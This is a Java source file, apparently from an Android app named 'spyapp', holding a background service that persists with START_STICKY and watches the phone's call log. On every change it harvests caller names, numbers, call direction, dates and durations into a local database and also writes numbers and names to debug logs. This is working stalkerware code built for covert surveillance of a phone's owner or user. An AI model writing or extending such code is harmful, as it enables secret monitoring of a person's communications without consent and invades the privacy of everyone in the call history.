package com.app.spyapp.service;

import android.Manifest;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.ContentObserver;
import android.database.Cursor;
import android.os.Handler;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.support.v4.app.ActivityCompat;
import android.text.TextUtils;
import android.util.Log;

import com.app.spyapp.SpyApp;
import com.app.spyapp.common.Utils;
import com.app.spyapp.common.WriteLog;
import com.app.spyapp.model.CallLogModel;
import com.app.spyapp.model.ContactModel;

import java.util.ArrayList;


public class CallLogChangeService extends Service {

    private ContentResolver contentResolver;
    private SpyApp spyApp;
    private long lastTimeofCall = 0L;
    private long lastTimeofUpdate = 0L;
    private long threshold_time = 10000;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        spyApp = (SpyApp) getApplicationContext();
    }

    public void registerObserver() {
        this.getApplicationContext()
                .getContentResolver()
                .registerContentObserver(
                        CallLog.Calls.CONTENT_URI, true,
                        new MyContentObserver());

    }

    //start the service and register observer for lifetime
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        registerObserver();

        return START_STICKY;
    }

    class MyContentObserver extends ContentObserver {
        public MyContentObserver() {
            super(null);
        }

        @Override
        public boolean deliverSelfNotifications() {
            return true;
        }

        @Override
        public void onChange(boolean selfChange) {
            super.onChange(selfChange);
            lastTimeofCall = System.currentTimeMillis();
            if (lastTimeofCall - lastTimeofUpdate > threshold_time) {
                WriteLog.E(CallLogChangeService.class.getSimpleName(), "CALL LOG CHANGE");
                //write your code to find updated contacts here
                ArrayList<CallLogModel> calllogList = getCallDetails();
                if (calllogList != null && calllogList.size() > 0) {
                    for (int i = 0; i < calllogList.size(); i++) {
                        CallLogModel callLogModel = calllogList.get(i);
                        if (!spyApp.getDatabaseHelper().isCallLogExits(callLogModel.getCalllogId())) {
                            spyApp.getDatabaseHelper().insertCallLog(callLogModel);

                            Log.i("Debug", "CallLogChange,number" + callLogModel.getPhnNumber() + "\n" +
                                    "user" + callLogModel.getUsername());
                        }
                    }
                }
                lastTimeofUpdate = System.currentTimeMillis();
            }


            // here you call the method to fill the list
        }

    }

    /**
     * Get Calllog detail
     *
     * @return
     */
    private ArrayList<CallLogModel> getCallDetails() {

        ArrayList<CallLogModel> callLogList = new ArrayList<>();
        StringBuffer sb = new StringBuffer();
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return null;
        }
        Cursor managedCursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DEFAULT_SORT_ORDER);
        int name = managedCursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
        int calllogid = managedCursor.getColumnIndex(CallLog.Calls._ID);

        sb.append("Call Details :");
        Log.i("Debug","call Details, CallLogChangeService");
        while (managedCursor.moveToNext()) {
            CallLogModel callLogModel = new CallLogModel();
            String callogID = managedCursor.getString(calllogid);
            String uname = managedCursor.getString(name);
            String phNumber = managedCursor.getString(number);
            String callType = managedCursor.getString(type);
            String callDate = managedCursor.getString(date);
            String callDayTime = Utils.convertMilisToDate(Long.parseLong(callDate));
            String callDuration = managedCursor.getString(duration);
            String dir = null;
            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;

                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }

            callLogModel.setCalllogId(callogID);
            callLogModel.setUsername(uname);
            callLogModel.setPhnNumber(phNumber);
            callLogModel.setCallDate(callDayTime);
            callLogModel.setCallDuration(callDuration);
            callLogModel.setDir(dir);
            callLogModel.setDircode(dircode);
            callLogModel.setCallType(callType);
            callLogList.add(callLogModel);
        }
        managedCursor.close();
        return callLogList;
    }

}
